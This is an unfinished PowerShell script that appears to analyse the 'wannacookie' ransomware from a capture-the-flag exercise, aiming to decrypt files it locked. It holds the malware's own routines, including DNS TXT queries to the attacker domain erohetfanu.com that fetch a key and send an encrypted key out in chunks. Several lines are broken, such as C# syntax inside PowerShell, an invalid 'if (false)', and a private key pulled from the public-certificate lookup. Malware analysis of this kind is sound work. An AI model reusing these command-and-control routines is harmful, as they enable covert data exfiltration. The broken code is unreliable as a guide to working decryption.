
function Dec-File($key, $File) {
    [byte[]]$key = $key
    $Suffix = "`.wannacookie"
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
    [System.Int32]$KeySize = $key.Length*8

    $AESP = New-Object 'System.Security.Cryptography.AesManaged'
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AESP.BlockSize = 128
    $AESP.KeySize = $KeySize
    $AESP.Key = $key

    $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
    $DestFile = ($File -replace $Suffix)

    $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)

    [Byte[]]$LenIV = New-Object Byte[] 4
    $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $FileSR.Read($LenIV,  0, 3) | Out-Null
        [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
        [Byte[]]$IV = New-Object Byte[] $LIV
    $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
    $FileSR.Read($IV, 0, $LIV) | Out-Null
    $AESP.IV = $IV

    $Transform = $AESP.CreateDecryptor()

    $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count = 0
    [Int]$BlockSzBts = $AESP.BlockSize / 8
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts

    Do
    {
        $Count = $FileSR.Read($Data, 0, $BlockSzBts)
        $CryptoS.Write($Data, 0, $Count)
    }
    While ($Count -gt 0)
    $CryptoS.FlushFinalBlock()
    $CryptoS.Close()
    $FileSR.Close()
    $FileSW.Close()
    Clear-variable -Name "key"
    Remove-Item $File
}

$possibleKeys = {
  "033ecb2bc07a4d43b5ef94ed5a35d280",
  "cf522b78d86c486691226b40aa69e95c",
  "9e210fe47d09416682b841769c78b8a3",
  "4ec4f0187cb04f4cb6973460dfe252df",
  "27c87ef9bbda4f709f6b4002fa4af63c"
}

function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
}

function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }

    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
}


function H2Bytes {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }

        ForEach ($value in $HX){
        [Convert]::ToByte($value,16)
    }
}


function Sha1([String] $String) {
    $SB = New-Object System.Text.StringBuilder [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{ [Void]$SB.Append($_.ToString("x2")) }
    $SB.ToString()
}


function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
    $cert.Import($pub_bytes)
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
    return $(B2H $encKey)
}

function get_over_dns($f) {
    $h = ''
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
    }
    return (H2A $h)
}

function H2A() {
    Param($a)
    $outa
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
    return $outa
}

$Byte_key = (
  [ System.Text.Encoding]::Unicode.GetBytes(
      $(    ([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join '')
    )  | ? {$_ -ne 0x00}
)


function split_to_chunks($astring, $size=32) {
    $new_arr = @()
    $chunk_index=0
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size))
        $chunk_index += $size
    }
    return $new_arr
}

function send_key($encrypted_key) {
    $chunks = (split_to_chunks $encrypted_key )

    echo "First chunk is $($chunks[0])";
    echo $chunks;

    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $new_cookie = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        } else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$new_cookie.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    }
    return $new_cookie
}


$encryptedKey = "3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971";
if ($false) {
    echo "AAAAA The generated Byte_key key is $Byte_key length $($Byte_key.length) bytes";

    $Hex_key = $(B2H $Byte_key)
    echo "AAAAA The generated Hex_key key is $Hex_key length $($Hex_key.length) bytes";

    $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
    echo "AAAAA The pub_key value is $pub_key and it's length $($pub_key.length)";

    $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
    echo "AAAAA The Pub_key_encrypted_Key value is $Pub_key_encrypted_Key and it's length $($Pub_key_encrypted_Key.length)";


    $cookie_id = (send_key($encryptedKey));


    echo "The cookie_id is $cookie_id and it's length is $($cookie_id.length)";
    $cookie_and_key = $(Resolve-DnsName -Server erohetfanu.com -Name ("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings


    echo "AAAAA The cookie_and_key variable is $cookie_and_key and it's length is $($cookie_and_key.length)"


    $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
    echo "AAAAA The pub_key value is $pub_key and it's length $($pub_key.length)";
}

$hexaPrivateKey = "66667272727869657268667865666B73";

[byte[]] $bytesPrivateKey = $(H2Bytes $hexaPrivateKey);

# echo "Binary Private Key Start ---";
# echo $bytesPrivateKey;
# echo $bytesPrivateKey[0].GetType();
# echo "Binary Private Key End ---";


$binaryEncryptedData = $(H2B $encryptedKey);


function MyDecFunc($encrypted, $binaryPrivateKey) {

    echo $binaryPrivateKey.GetType();

    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;

    RSACryptoServiceProvider $certificatePrivateKey = $binaryPrivateKey;

    $cert.PrivateKey = $certificatePrivateKey;
    # $cert.Import($binaryPrivateKey);

    $encKey = $cert.PrivateKey.Decrypt($encrypted, $false);

    return $(B2H $encKey);
};

if (false){
    $HexaKeyUsedToEncryptFiles = $(MyDecFunc $binaryEncryptedData $bytesPrivateKey);

    echo $HexaKeyUsedToEncryptFiles;
}


if($true){
    echo "-----BEGIN PUBLIC KEY-----" | Out-File public.pem
    $base64PubKey = $(get_over_dns("7365727665722E637274") ) ;
    echo $base64PubKey | Out-File -Append public.pem
    echo "-----END PUBLIC KEY-----" | Out-File -Append public.pem
    $pub_key = [System.Convert]::FromBase64String($base64PubKey)


    echo "-----BEGIN RSA PRIVATE KEY-----" | Out-File private.pem
    $base64PrivateKey = $(get_over_dns("7365727665722E637274") ) ;
    echo $base64PrivateKey | Out-File -Append private.pem
    echo "-----END RSA PRIVATE KEY-----" | Out-File -Append private.pem

    $privateKey = [System.Convert]::FromBase64String($base64PrivateKey);
}

function Pub_Key_Dec($key_bytes){
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
    $cert.Import("z:\server.key")
    $encKey = $cert.PrivateKey.Decrypt($key_bytes, $true)
    return $(B2H $encKey)
}

H2B $encryptedKey | Out-File binaryEncryptedData

# $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
# $cert.import();
# echo $cert.GetType();
# echo $cert.PrivateKey.GetType();
